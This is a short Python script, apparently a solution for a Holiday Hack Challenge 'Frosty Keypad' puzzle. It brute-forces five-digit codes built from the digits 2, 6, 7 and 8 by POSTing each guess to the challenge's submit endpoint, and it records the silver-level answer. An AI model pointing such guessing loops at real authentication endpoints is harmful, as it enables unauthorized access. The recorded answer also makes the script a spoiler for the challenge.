import requests
import itertools
import time

# This code is for gold award
# Iterates over all strings of length 5 containing digits 2,6,7,8

url = "https://hhc24-frostykeypad.holidayhackchallenge.com"
res = "/submit?id=null"

#d = { "answer": "51687" }
h = { "Content-Type" : "application/json" }

#response = requests.post(url + res, json=d, headers=h)

#print(response.text)
#print(response.json())

# Correct answer for silver: 72682

digits = ("2", "6", "7", "8")

# 1024 possibilities in total
for i in digits:
    for j in digits:
        for k in digits:
            for m in digits:
                for n in digits:
                    guess = i + j + k + m + n
                    if guess != "72682":
                        print(guess)
                        d = { "answer": guess }
                        response = requests.post(url + res, json=d, headers=h)
                        resp = response.json()
                        if "error" in resp.keys():
                            print("wrong key!")
                        else:
                            print("seems right!")
                            print(response.text)
                            exit()
                        time.sleep(1)



